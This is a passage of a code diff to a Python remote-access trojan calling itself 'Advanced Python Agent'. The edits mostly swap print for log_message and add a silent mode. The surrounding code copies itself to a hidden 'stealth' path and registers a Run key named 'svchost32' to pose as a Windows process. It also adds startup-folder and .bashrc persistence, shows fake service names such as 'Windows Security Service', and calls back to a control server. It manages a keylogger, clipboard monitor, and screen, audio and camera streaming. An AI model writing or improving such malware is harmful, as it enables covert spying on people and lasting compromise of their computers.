+        log_message(f"[WARN] Failed to initialize high-performance capture: {e}")
         high_performance_capture = None
     
     # Initialize low-latency input handler
     try:
         low_latency_input = LowLatencyInputHandler()
         low_latency_input.start()
-        print("[OK] Low-latency input handler initialized")
+        log_message("[OK] Low-latency input handler initialized")
     except Exception as e:
-        print(f"[WARN] Failed to initialize low-latency input: {e}")
+        log_message(f"[WARN] Failed to initialize low-latency input: {e}")
         low_latency_input = None
 
 def add_to_startup():
@@ -7389,7 +7522,7 @@ def add_to_startup():
             # Linux startup methods
             add_linux_startup()
     except Exception as e:
-        print(f"[WARN] Startup configuration failed: {e}")
+        log_message(f"[WARN] Startup configuration failed: {e}")
 
 def add_registry_startup():
     """Add to Windows registry startup."""
@@ -7400,11 +7533,11 @@ def add_registry_startup():
         if hasattr(sys, 'frozen') and sys.frozen:
             # Running as compiled executable (PyInstaller)
             current_exe = sys.executable
-            print(f"[DEBUG] Running as compiled exe: {current_exe}")
+            log_message(f"[DEBUG] Running as compiled exe: {current_exe}")
         else:
             # Running as Python script
             current_exe = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
-            print(f"[DEBUG] Running as Python script: {current_exe}")
+            log_message(f"[DEBUG] Running as Python script: {current_exe}")
         
         # Define the stealth deployment path
         stealth_exe_path = os.path.join(
@@ -7416,7 +7549,7 @@ def add_registry_startup():
         
         # Check if we need to deploy to stealth location first
         if not os.path.exists(stealth_exe_path):
-            print("[INFO] Deploying to stealth location...")
+            log_message("[INFO] Deploying to stealth location...")
             try:
                 # Create directory if it doesn't exist
                 os.makedirs(os.path.dirname(stealth_exe_path), exist_ok=True)
@@ -7425,15 +7558,15 @@ def add_registry_startup():
                     # Copy the compiled executable
                     import shutil
                     shutil.copy2(sys.executable, stealth_exe_path)
-                    print(f"[OK] Executable deployed to: {stealth_exe_path}")
+                    log_message(f"[OK] Executable deployed to: {stealth_exe_path}")
                 else:
-                    print("[WARN] Cannot deploy Python script as executable - run PyInstaller first")
+                    log_message("[WARN] Cannot deploy Python script as executable - run PyInstaller first", "warning")
                     # For Python script, create a batch wrapper
                     batch_path = stealth_exe_path.replace('.exe', '.bat')
                     with open(batch_path, 'w') as f:
                         f.write(f'@echo off\ncd /d "{os.path.dirname(os.path.abspath(__file__))}"\npython.exe "{os.path.basename(os.path.abspath(__file__))}"\n')
                     stealth_exe_path = batch_path
-                    print(f"[OK] Batch wrapper deployed to: {stealth_exe_path}")
+                    log_message(f"[OK] Batch wrapper deployed to: {stealth_exe_path}")
                 
                 # Set hidden and system attributes
                 try:
@@ -7443,11 +7576,11 @@ def add_registry_startup():
                     pass
                     
             except Exception as deploy_error:
-                print(f"[ERROR] Failed to deploy to stealth location: {deploy_error}")
+                log_message(f"[ERROR] Failed to deploy to stealth location: {deploy_error}")
                 # Fall back to current location
                 stealth_exe_path = current_exe
         else:
-            print(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
+            log_message(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
         
         # Add to registry pointing to the stealth location
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
@@ -7455,7 +7588,7 @@ def add_registry_startup():
         winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{stealth_exe_path}"')
         winreg.CloseKey(key)
         
-        print(f"[OK] Registry persistence established: {stealth_exe_path}")
+        log_message(f"[OK] Registry persistence established: {stealth_exe_path}")
         
         # Verify the registry entry was created
         try:
@@ -7463,15 +7596,15 @@ def add_registry_startup():
                                       r"Software\Microsoft\Windows\CurrentVersion\Run")
             value, _ = winreg.QueryValueEx(verify_key, "svchost32")
             winreg.CloseKey(verify_key)
-            print(f"[DEBUG] Registry entry verified: svchost32 = {value}")
+            log_message(f"[DEBUG] Registry entry verified: svchost32 = {value}")
         except Exception as verify_error:
-            print(f"[WARN] Could not verify registry entry: {verify_error}")
+            log_message(f"[WARN] Could not verify registry entry: {verify_error}")
             
     except Exception as e:
-        print(f"[ERROR] Registry startup failed: {e}")
+        log_message(f"[ERROR] Registry startup failed: {e}")
         # Print detailed error information
         import traceback
-        traceback.print_exc()
+        log_message(f"Exception details: {traceback.format_exc()}", "error")
 
 def add_startup_folder_entry():
     """Add to Windows startup folder."""
@@ -7488,9 +7621,9 @@ def add_startup_folder_entry():
             subprocess.run(["attrib", "+h", batch_file], capture_output=True)
         except:
             pass
-        print("[OK] Added to startup folder")
+        log_message("[OK] Added to startup folder")
     except Exception as e:
-        print(f"[WARN] Startup folder entry failed: {e}")
+        log_message(f"[WARN] Startup folder entry failed: {e}")
 
 def add_linux_startup():
     """Add to Linux startup."""
@@ -7504,9 +7637,9 @@ def add_linux_startup():
             if startup_line not in f.read():
                 with open(bashrc_path, "a") as f:
                     f.write(startup_line)
-                print("[OK] Added to Linux startup")
+                log_message("[OK] Added to Linux startup")
     except Exception as e:
-        print(f"[WARN] Linux startup configuration failed: {e}")
+        log_message(f"[WARN] Linux startup configuration failed: {e}")
 
 def check_registry_persistence():
     """Check if registry persistence entry exists."""
@@ -7519,26 +7652,26 @@ def check_registry_persistence():
                            r"Software\Microsoft\Windows\CurrentVersion\Run")
         value, _ = winreg.QueryValueEx(key, "svchost32")
         winreg.CloseKey(key)
-        print(f"[OK] Registry persistence exists: svchost32 = {value}")
+        log_message(f"[OK] Registry persistence exists: svchost32 = {value}")
         
         # Check if the file actually exists
         target_file = value.strip('"')
         if os.path.exists(target_file):
-            print(f"[OK] Target file exists: {target_file}")
+            log_message(f"[OK] Target file exists: {target_file}")
             return True
         else:
-            print(f"[WARN] Target file does not exist: {target_file}")
+            log_message(f"[WARN] Target file does not exist: {target_file}")
             return False
             
     except Exception as e:
-        print(f"[INFO] No registry persistence found: {e}")
+        log_message(f"[INFO] No registry persistence found: {e}")
         return False
 def agent_main():
     """Main function for agent mode (original main functionality)."""
-    print("=" * 60)
-    print("Advanced Python Agent v2.0")
-    print("Starting up...")
-    print("=" * 60)
+    log_message("=" * 60)
+    log_message("Advanced Python Agent v2.0")
+    log_message("Starting up...")
+    log_message("=" * 60)
     
     # Check if running from stealth location
     current_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
@@ -7550,37 +7683,42 @@ def agent_main():
     )
     
     if current_path == stealth_path:
-        print("[INFO] Running from stealth location")
+        log_message("[INFO] Running from stealth location")
     else:
-        print("[INFO] Running from original location - will deploy to stealth location")
+        log_message("[INFO] Running from original location - will deploy to stealth location")
+    
+    # Check system requirements first
+    requirements_ok = check_system_requirements()
+    if not requirements_ok:
+        log_message("Some critical requirements missing - functionality may be limited", "warning")
     
     # Initialize agent with error handling
     try:
         if WINDOWS_AVAILABLE:
-            print("Running on Windows - initializing Windows-specific features...")
+            log_message("Running on Windows - initializing Windows-specific features...")
             
             # Check admin privileges
             if is_admin():
-                print("[OK] Running with administrator privileges")
+                log_message("[OK] Running with administrator privileges")
                 # Setup advanced persistence if available
                 try:
                     setup_advanced_persistence()
                 except Exception as e:
-                    print(f"[WARN] Could not setup advanced persistence: {e}")
+                    log_message(f"[WARN] Could not setup advanced persistence: {e}")
             else:
-                print("[INFO] Not running as administrator. Using basic persistence...")
+                log_message("[INFO] Not running as administrator. Using basic persistence...")
                 # Setup basic persistence
                 try:
                     establish_persistence()
                 except Exception as e:
-                    print(f"[WARN] Could not setup persistence: {e}")
+                    log_message(f"[WARN] Could not setup persistence: {e}")
         else:
-            print("Running on non-Windows system")
+            log_message("Running on non-Windows system")
             # Setup Linux persistence
             try:
                 establish_linux_persistence()
             except Exception as e:
-                print(f"[WARN] Could not setup Linux persistence: {e}")
+                log_message(f"[WARN] Could not setup Linux persistence: {e}")
         
         # Setup startup (non-blocking)
         try:
@@ -7589,64 +7727,71 @@ def agent_main():
             if WINDOWS_AVAILABLE:
                 check_registry_persistence()
         except Exception as e:
-            print(f"[WARN] Could not add to startup: {e}")
+            log_message(f"[WARN] Could not add to startup: {e}")
         
-        # Auto self-deploy when running
-        try:
-            print("[INFO] Initiating automatic self-deployment...")
-            if self_deploy_powershell():
-                print("[OK] Self-deployment completed successfully")
-                print("[INFO] Agent will now run from stealth location on next login")
-            else:
-                print("[WARN] Self-deployment failed or was skipped")
-        except Exception as e:
-            print(f"[WARN] Self-deployment failed: {e}")
+        # Auto self-deploy when running (only if not already deployed)
+        global DEPLOYMENT_COMPLETED
+        if not DEPLOYMENT_COMPLETED:
+            try:
+                log_message("Initiating automatic self-deployment...")
+                if self_deploy_powershell():
+                    log_message("Self-deployment completed successfully")
+                    log_message("Agent will now run from stealth location on next login")
+                else:
+                    log_message("Self-deployment failed or was skipped", "warning")
+            except Exception as e:
+                log_message(f"Self-deployment failed: {e}", "warning")
         
         # Get or create agent ID
         agent_id = get_or_create_agent_id()
-        print(f"[OK] Agent starting with ID: {agent_id}")
+        log_message(f"[OK] Agent starting with ID: {agent_id}")
         
-        print("Initializing connection to server...")
+        log_message("Initializing connection to server...")
         
         # Main connection loop with improved error handling
         connection_attempts = 0
         while True:
             try:
                 connection_attempts += 1
-                print(f"Connecting to server (attempt {connection_attempts})...")
-                if sio is None:
-                    print("[ERROR] Socket.IO not available - cannot connect to server")
+                log_message(f"Connecting to server (attempt {connection_attempts})...")
+                if sio is None or not SOCKETIO_AVAILABLE:
+                    log_message("Socket.IO not available - running in offline mode", "warning")
+                    # Continue running in offline mode
+                    log_message("Agent running in offline mode - no server communication")
+                    while True:
+                        time.sleep(60)  # Keep alive in offline mode
+                        # Could implement local functionality here
                     return
                     
                 sio.connect(SERVER_URL)
-                print("[OK] Connected to server successfully!")
+                log_message("[OK] Connected to server successfully!")
                 sio.wait()
             except socketio.exceptions.ConnectionError:
-                print(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
+                log_message(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
                 time.sleep(10)
             except KeyboardInterrupt:
-                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
+                log_message("\n[INFO] Received interrupt signal. Shutting down gracefully...")
                 break
             except Exception as e:
-                print(f"[ERROR] An unexpected error occurred: {e}")
+                log_message(f"[ERROR] An unexpected error occurred: {e}")
                 # Cleanup resources
                 try:
                     stop_streaming()
                     stop_audio_streaming()
                     stop_camera_streaming()
-                    print("[OK] Cleaned up resources.")
+                    log_message("[OK] Cleaned up resources.")
                 except Exception as cleanup_error:
-                    print(f"[WARN] Error during cleanup: {cleanup_error}")
+                    log_message(f"[WARN] Error during cleanup: {cleanup_error}")
                 
-                print("Retrying in 10 seconds...")
+                log_message("Retrying in 10 seconds...")
                 time.sleep(10)
     
     except KeyboardInterrupt:
-        print("\n[INFO] Agent shutdown requested.")
+        log_message("\n[INFO] Agent shutdown requested.")
     except Exception as e:
-        print(f"[ERROR] Critical error during startup: {e}")
+        log_message(f"[ERROR] Critical error during startup: {e}")
     finally:
-        print("[INFO] Agent shutting down.")
+        log_message("[INFO] Agent shutting down.")
         try:
             if sio and hasattr(sio, 'connected') and sio.connected:
                 sio.disconnect()
@@ -7655,50 +7800,50 @@ def agent_main():
 
 def signal_handler(signum, frame):
     """Handle shutdown signals gracefully."""
-    print("\nAgent shutting down.")
+    log_message("\nAgent shutting down.")
     try:
         # Stop all streaming and monitoring
         try:
             stop_streaming()
         except Exception as e:
-            print(f"Error stopping streaming: {e}")
+            log_message(f"Error stopping streaming: {e}")
         
         try:
             stop_audio_streaming()
         except Exception as e:
-            print(f"Error stopping audio streaming: {e}")
+            log_message(f"Error stopping audio streaming: {e}")
         
         try:
             stop_camera_streaming()
         except Exception as e:
-            print(f"Error stopping camera streaming: {e}")
+            log_message(f"Error stopping camera streaming: {e}")
         
         try:
             stop_keylogger()
         except Exception as e:
-            print(f"Error stopping keylogger: {e}")
+            log_message(f"Error stopping keylogger: {e}")
         
         try:
             stop_clipboard_monitor()
         except Exception as e:
-            print(f"Error stopping clipboard monitor: {e}")
+            log_message(f"Error stopping clipboard monitor: {e}")
         
         try:
             if 'low_latency_input' in globals() and low_latency_input:
                 low_latency_input.stop()
         except Exception as e:
-            print(f"Error stopping low latency input: {e}")
+            log_message(f"Error stopping low latency input: {e}")
         
         # Disconnect from server
         if SOCKETIO_AVAILABLE and 'sio' in globals() and sio.connected:
             try:
                 sio.disconnect()
             except Exception as e:
-                print(f"Error disconnecting from server: {e}")
+                log_message(f"Error disconnecting from server: {e}")
         
-        print("Cleanup complete.")
+        log_message("Cleanup complete.")
     except Exception as e:
-        print(f"Error during cleanup: {e}")
+        log_message(f"Error during cleanup: {e}")
     
     sys.exit(0)
 
@@ -7707,35 +7852,45 @@ if __name__ == "__main__":
     try:
         sleep_random_non_blocking()  # Add random delay
     except Exception as e:
-        print(f"[STEALTH] Stealth initialization failed: {e}")
+        log_message(f"[STEALTH] Stealth initialization failed: {e}")
     
-    # Obfuscate startup messages
-    startup_messages = [
-        "System Update Service",
-        "Windows Security Service", 
-        "Microsoft Update Service",
-        "System Configuration Service",
-        "Windows Management Service",
-        "System Maintenance Service",
-        "Windows Update Service",
-        "System Optimization Service"
-    ]
-    
-    service_name = random.choice(startup_messages)
-    print("=" * 60)
-    print(f"{service_name} v2.1")
-    print("Initializing system components...")
-    print("=" * 60)
+    # Obfuscate startup messages (only if not in silent mode)
+    if not SILENT_MODE:
+        startup_messages = [
+            "System Update Service",
+            "Windows Security Service", 
+            "Microsoft Update Service",
+            "System Configuration Service",
+            "Windows Management Service",
+            "System Maintenance Service",
+            "Windows Update Service",
+            "System Optimization Service"
+        ]
+        
+        service_name = random.choice(startup_messages)
+        log_message("=" * 60)
+        log_message(f"{service_name} v2.1")
+        log_message("Initializing system components...")
+        log_message("=" * 60)
     
     # CRITICAL FIX: Call agent_main() which contains the persistence logic
     try:
         agent_main()
     except KeyboardInterrupt:
-        print("\n[INFO] System shutdown requested.")
+        log_message("System shutdown requested.")
+    except ImportError as e:
+        log_message(f"Missing dependency: {e}", "error")
+        log_message("Agent will continue with limited functionality", "warning")
+        # Continue running with basic functionality
+        while True:
+            time.sleep(60)
     except Exception as e:
-        print(f"[ERROR] System error: {e}")
+        log_message(f"System error: {e}", "error")
+        log_message("Attempting to recover and continue...", "warning")
+        # Try to recover and continue
+        time.sleep(5)
     finally:
-        print("[INFO] Shutting down system components.")
+        log_message("Shutting down system components.")
         try:
             if sio and hasattr(sio, 'connected') and sio.connected:
                 sio.disconnect()
